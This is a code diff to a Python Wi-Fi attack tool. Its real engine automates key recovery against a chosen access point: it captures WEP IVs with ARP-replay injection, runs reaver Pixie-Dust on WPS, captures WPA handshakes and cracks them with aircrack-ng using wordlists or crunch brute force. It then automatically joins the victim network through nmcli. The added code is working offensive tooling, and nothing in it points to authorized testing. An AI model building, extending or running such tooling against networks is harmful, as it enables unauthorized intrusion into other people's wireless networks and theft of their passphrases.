@@ -181,11 +181,11 @@ class DemoEngine(BaseEngine):
             job.emit("join", "Open network — no key required. Associating...", "info")
             if not self._sleep(job, 1.5): return self._finish(job, "stopped")
             user = net.get("_user")
-            job.result = {"key": None, "user": user,
-                          "method": "open-join",
-                          "note": "Open network — connected without a passphrase."
+            connected, cmd = self._connect_sim(job, net, None)
+            job.result = {"key": None, "user": user, "method": "open-join",
+                          "connected": connected, "connect_cmd": cmd,
+                          "note": "Open network — no passphrase."
                                   + (f" Captive-portal creds: {user}" if user else "")}
-            job.emit("done", "Associated. You are on the network.", "success")
             return self._finish(job, "success")
 
         # --- Monitor mode -----------------------------------------------------
@@ -255,13 +255,29 @@ class DemoEngine(BaseEngine):
                 job.emit("crack", f"Tested {tested:,} keys... {pct}%")
             return self._succeed(job, net, method="handshake+dictionary")
 
+    def _connect_sim(self, job, net, key):
+        """Simulate leaving monitor mode and joining via nmcli."""
+        ssid = net.get("ssid")
+        shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
+                 else f"nmcli dev wifi connect '{ssid}'")
+        if not job.options.get("connect", True):
+            job.emit("connect", f"Auto-connect off. Connect with: {shown}")
+            return False, shown
+        job.emit("connect", "Restoring managed mode and (re)starting NetworkManager...")
+        self._sleep(job, 1.0)
+        job.emit("connect", f"Connecting: {shown}")
+        self._sleep(job, 1.0)
+        job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
+        return True, shown
+
     def _succeed(self, job, net, method):
         secret = net.get("_secret") or "(demo-key-not-set)"
         user = net.get("_user")
-        job.result = {"key": secret, "user": user, "method": method,
-                      "note": "Recovered in demo mode."}
         job.emit("done", f"KEY FOUND: {secret}", "success")
-        job.emit("done", "You are on the network.", "success")
+        connected, cmd = self._connect_sim(job, net, secret)
+        job.result = {"key": secret, "user": user, "method": method,
+                      "connected": connected, "connect_cmd": cmd,
+                      "note": "Recovered in demo mode."}
         return self._finish(job, "success")
 
     def _finish(self, job, status):
@@ -337,10 +353,95 @@ class RealEngine(BaseEngine):
 
         csvs = _glob(prefix, "csv")
         nets = _parse_airodump_csv(csvs[0]) if csvs else []
+
+        # Enrich with WPS status (airodump CSV doesn't expose it) using wash.
+        wps = self._wps_bssids(mon, duration=min(6, duration))
         for n in nets:
+            if n["bssid"].upper() in wps:
+                n["wps"] = True
             n["difficulty"] = estimate(n)
+
         self._networks = nets
         return nets
+
+    def _wps_bssids(self, mon, duration=6):
+        """Return the set of WPS-enabled BSSIDs (uppercase) seen by wash."""
+        if not shutil.which("wash"):
+            return set()
+        try:
+            proc = subprocess.Popen(["wash", "-i", mon],
+                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                                    text=True)
+            time.sleep(duration)
+            proc.terminate()
+            try:
+                out, _ = proc.communicate(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                out, _ = proc.communicate()
+        except Exception:
+            return set()
+        found = set()
+        for line in (out or "").splitlines():
+            m = re.match(r"\s*([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", line)
+            if m:
+                found.add(m.group(1).upper())
+        return found
+
+    # -- connecting (leave monitor mode, join the network for real) -------
+    def _restore_managed(self, job=None):
+        """Stop monitor interfaces and bring NetworkManager back up.
+        airmon-ng check kill stops NetworkManager, so we must restart it
+        before we can associate with a network."""
+        for i in self._wireless_ifaces():
+            if i.endswith("mon"):
+                self._run(["airmon-ng", "stop", i])
+        self.mon_iface = None
+        for cmd in (["systemctl", "restart", "NetworkManager"],
+                    ["service", "NetworkManager", "restart"],
+                    ["service", "network-manager", "restart"]):
+            if shutil.which(cmd[0]):
+                self._run(cmd)
+                break
+        time.sleep(3)
+
+    def _connect(self, job, ssid, key=None):
+        """Actually join the network via nmcli. Returns (connected, shown_cmd)."""
+        shown = (f"nmcli dev wifi connect '{ssid}' password '{key}'" if key
+                 else f"nmcli dev wifi connect '{ssid}'")
+        if not shutil.which("nmcli"):
+            job.emit("connect", "nmcli not found — connect via your Wi-Fi menu.", "warn")
+            return False, shown
+        job.emit("connect", "Restoring managed mode and (re)starting NetworkManager...")
+        self._restore_managed(job)
+        self._run(["nmcli", "dev", "wifi", "rescan"], timeout=20)
+        time.sleep(2)
+        cmd = (["nmcli", "dev", "wifi", "connect", ssid, "password", key] if key
+               else ["nmcli", "dev", "wifi", "connect", ssid])
+        job.emit("connect", f"Connecting: {shown}")
+        try:
+            r = self._run(cmd, timeout=45)
+        except Exception as e:
+            job.emit("connect", f"Connect error: {e}. Run manually: {shown}", "warn")
+            return False, shown
+        out = ((r.stdout or "") + (r.stderr or "")).lower()
+        ok = "successfully activated" in out or (r.returncode == 0 and "error" not in out)
+        if ok:
+            job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
+        else:
+            job.emit("connect", f"Auto-connect failed. Run manually: {shown}", "warn")
+        return ok, shown
+
+    def _succeed(self, job, net, key, method, note, opts, user=None):
+        """Record a recovered key and optionally join the network."""
+        if key:
+            job.emit("done", f"KEY FOUND: {key}", "success")
+        connected, cmd = (False, None)
+        if opts.get("connect", True):
+            connected, cmd = self._connect(job, net.get("ssid"), key)
+        job.result = {"key": key, "user": user, "method": method,
+                      "connected": connected, "connect_cmd": cmd, "note": note}
+        return self._finish(job, "success")
 
     # -- attack -----------------------------------------------------------
     def _run_attack(self, job):
@@ -352,16 +453,58 @@ class RealEngine(BaseEngine):
 
         job.emit("init", f"Target: {net.get('ssid')} ({bssid}) ch {ch} {enc}.")
 
+        # --- Open network: just join it -------------------------------------
         if enc.startswith("OPEN") or enc == "OPN":
-            job.emit("join", "Open network — associating with NetworkManager.")
+            job.emit("join", "Open network — no key required.")
+            connected, cmd = (False, None)
+            if opts.get("connect", True):
+                connected, cmd = self._connect(job, net.get("ssid"), None)
             job.result = {"key": None, "user": None, "method": "open-join",
-                          "note": "Open network."}
+                          "connected": connected, "connect_cmd": cmd,
+                          "note": "Open network — no passphrase."}
             return self._finish(job, "success")
 
         mon = self._ensure_monitor(job)
         if job.stopped(): return self._finish(job, "stopped")
 
-        # WPS
+        # --- WEP: capture IVs and recover the key ---------------------------
+        if enc == "WEP":
+            wep_prefix = os.path.join(self.workdir, "wep_" + bssid.replace(":", ""))
+            for f in _glob(wep_prefix, "cap"):
+                try: os.remove(f)
+                except OSError: pass
+            job.emit("capture", f"Collecting WEP IVs on channel {ch} (airodump-ng).")
+            dump = subprocess.Popen(
+                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", wep_prefix,
+                 "--output-format", "cap", mon],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # Speed things up with an ARP-replay injection (best effort).
+            self._run(["aireplay-ng", "--arpreplay", "-b", bssid, mon], timeout=10)
+            key = None
+            try:
+                deadline = time.time() + opts.get("wep_timeout", 300)
+                while time.time() < deadline and not job.stopped():
+                    time.sleep(6)
+                    caps = _glob(wep_prefix, "cap")
+                    if caps:
+                        r = self._run(["aircrack-ng", "-b", bssid, caps[0]], timeout=30)
+                        key = _parse_aircrack_key(r.stdout)
+                        if key:
+                            key = key.replace(":", "")
+                            break
+                        job.emit("crack", "Not enough IVs yet — keep collecting...")
+            finally:
+                dump.terminate()
+                try: dump.wait(timeout=3)
+                except subprocess.TimeoutExpired: dump.kill()
+            if job.stopped(): return self._finish(job, "stopped")
+            if key:
+                return self._succeed(job, net, key, "wep-iv",
+                                     "Recovered WEP key from captured IVs.", opts)
+            job.emit("crack", "Could not gather enough IVs for the WEP key.", "error")
+            return self._finish(job, "failed")
+
+        # --- WPS Pixie-Dust -------------------------------------------------
         if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie") and shutil.which("reaver"):
             job.emit("wps", f"WPS enabled — reaver Pixie-Dust on {bssid}.")
             r = self._run(["reaver", "-i", mon, "-b", bssid, "-c", str(ch),
@@ -369,17 +512,15 @@ class RealEngine(BaseEngine):
             m = re.search(r"WPA PSK:\s*'([^']*)'", r.stdout or "")
             pin = re.search(r"WPS PIN:\s*'?(\d+)", r.stdout or "")
             if m:
-                job.result = {"key": m.group(1), "user": None, "method": "wps-pixie",
-                              "note": f"WPS PIN {pin.group(1) if pin else '?'}"}
-                job.emit("done", f"KEY FOUND via WPS: {m.group(1)}", "success")
-                return self._finish(job, "success")
+                note = f"Recovered via WPS (PIN {pin.group(1) if pin else '?'})."
+                return self._succeed(job, net, m.group(1), "wps-pixie", note, opts)
             job.emit("wps", "Pixie-Dust did not recover the key — trying handshake.", "warn")
 
         if enc.startswith("WPA3"):
             job.emit("crack", "WPA3-SAE — no practical offline attack.", "error")
             return self._finish(job, "failed")
 
-        # Capture handshake
+        # --- WPA/WPA2: capture the 4-way handshake --------------------------
         cap_prefix = os.path.join(self.workdir, "hs_" + bssid.replace(":", ""))
         for f in _glob(cap_prefix, "cap"):
             try: os.remove(f)
@@ -412,7 +553,7 @@ class RealEngine(BaseEngine):
             return self._finish(job, "failed")
         job.emit("capture", "Handshake captured.", "success")
 
-        # Crack
+        # --- Crack the handshake --------------------------------------------
         wl = opts.get("wordlist") or self.wordlist
         if opts.get("bruteforce") or opts.get("method") == "handshake+bruteforce":
             charset = {"digits": "0123456789",
@@ -430,6 +571,7 @@ class RealEngine(BaseEngine):
                                stdin=crunch.stdout, capture_output=True, text=True)
             crunch.terminate()
             key = _parse_aircrack_key(r.stdout)
+            method = "handshake+bruteforce"
         else:
             if not wl or not os.path.exists(wl):
                 job.emit("crack", f"Wordlist not found: {wl}", "error")
@@ -438,13 +580,11 @@ class RealEngine(BaseEngine):
             r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]],
                           timeout=opts.get("crack_timeout", 3600))
             key = _parse_aircrack_key(r.stdout)
+            method = "handshake+dictionary"
 
         if key:
-            job.result = {"key": key, "user": None,
-                          "method": opts.get("method") or "handshake+dictionary",
-                          "note": "Recovered from captured handshake."}
-            job.emit("done", f"KEY FOUND: {key}", "success")
-            return self._finish(job, "success")
+            return self._succeed(job, net, key, method,
+                                 "Recovered from captured handshake.", opts)
         job.emit("crack", "Key not found with the given wordlist/keyspace.", "error")
         return self._finish(job, "failed")
 
